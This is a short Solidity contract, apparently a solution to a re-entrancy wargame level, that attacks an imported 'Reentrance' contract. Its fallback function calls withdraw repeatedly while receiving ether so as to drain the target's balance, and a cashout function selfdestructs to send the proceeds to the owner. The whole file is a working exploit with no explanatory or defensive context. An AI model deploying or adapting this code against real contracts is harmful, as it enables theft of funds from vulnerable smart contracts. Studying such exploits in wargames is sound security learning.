// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./re-entrancy.sol";

contract AttackReentrance {
    Reentrance reContract;
    address public owner;
    uint amount = 0.001 ether;

    constructor(address payable reContractAddress) public {
        reContract = Reentrance(reContractAddress);
        owner = msg.sender;
    }

    modifier isOwner() {
        require(msg.sender == owner);
        _;
    }

    function attack() public {
        reContract.withdraw(amount);
    }

    function donate() public isOwner {
        reContract.donate{value: amount}(address(this));
    }

    function cashout() public isOwner {
        selfdestruct(payable(owner));
    }

    // receive() external payable {}

    fallback() external payable {
        if (msg.sender == address(reContract)){
            for (uint i = 0; i < 3; i++){
                reContract.withdraw(amount);
            }
        }
    }
}
